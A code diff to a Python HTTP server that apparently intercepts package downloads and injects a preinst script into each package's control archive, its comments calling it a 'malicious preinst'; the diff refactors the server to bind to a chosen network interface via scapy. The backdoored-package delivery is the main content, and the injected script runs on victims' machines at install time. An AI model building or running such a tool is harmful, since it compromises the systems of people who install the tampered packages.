@@ -1,4 +1,5 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from scapy.all import get_if_addr
 import requests
 import os
 import os.path
@@ -28,7 +29,7 @@ class Server(BaseHTTPRequestHandler):
             os.system("tar x {}/control.tar".format(package))
 
             # checks whether preinst exists already
-            if(os.path.exists("{}/control.tar/preinst".format(package)) == False):
+            if(not os.path.exists("{}/control.tar/preinst".format(package))):
                 # add malicious preinst
                 os.system("tar rf {}/control.tar preinst".format(package))
             # if preinst already exists copy created preinst into the exisiting one
@@ -63,17 +64,19 @@ class Server(BaseHTTPRequestHandler):
             self.wfile.write(content)
             f.close()
 
-if __name__ == "__main__":
-    ip = "192.168.192.11"
-    port = 80
-
-    web_server = HTTPServer((ip, port), Server)
-    print("Server started at {}:{}".format(ip, port))
-
+def start_server(iface):
     try:
-        web_server.serve_forever()
-    except KeyboardInterrupt:
-        pass
+        ip = get_if_addr(iface)
+        port = 80
 
-    web_server.server_close()
-    print("Server stopped")
+        web_server = HTTPServer((ip, port), Server)
+        print("Server started at {}:{}".format(ip, port))
+
+        try:
+            web_server.serve_forever()
+        except KeyboardInterrupt:
+            web_server.server_close()
+            print("Server stopped")
+    except Exception:
+        import traceback
+        print(traceback.format_exc())
